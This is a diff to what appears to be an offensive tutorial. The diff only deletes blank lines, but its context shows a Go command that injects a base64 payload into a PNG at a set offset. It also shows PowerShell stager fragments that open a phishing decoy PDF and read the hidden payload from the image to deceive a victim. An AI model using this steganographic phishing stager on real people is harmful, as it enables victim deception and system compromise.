@@ -146,7 +146,6 @@ As seen in the screenshot chunks # 4 and 5 have a combined chunk length of 50 by
 ``go run main.go -i /path/to/<image file>.png -o <injected image>.png --inject --offset 0x46 --payload <base64 encoded payload>``
 
 ```html
-
 -i is the image we want to use
 
 -o is the new file we will create with the injected payload
@@ -181,7 +180,6 @@ Lets view and modify our powershell stager script before we encode it for our ph
 
 
 ```powershell
-
 # Phish decoy file
 $pdfFilePath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("UserProfile"), "Downloads\<zip folder>\<phish>.pdf")
 
@@ -253,7 +251,6 @@ The payload offset is 0x4E. CTRL + C to close Hexedit.
 **Update the powershell stager script to reflect this offset and also the payload length.**
 
 ```powershell
-
 $startOffset = 0x4E   # Offset of payload that was verified with hexedit
 $textLength = 40      # Length of payload
 
@@ -299,7 +296,6 @@ The other actions in the powershell stager will help in further deception to the
 Note: "Zip folder" is the folder that is created when the encrypted zip file is extracted. The folder created will be the name of the zip file and contain all the files.
 
 ```html
-
 $pdfFilePath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("UserProfile"), "Downloads\<zip folder>\<decoy>.pdf")
 $textFilePath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("UserProfile"), "Downloads\<zip folder>\<base64 encoded stager>.txt")
 $zipFolderPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("UserProfile"), "Downloads\<zip payload>.zip")
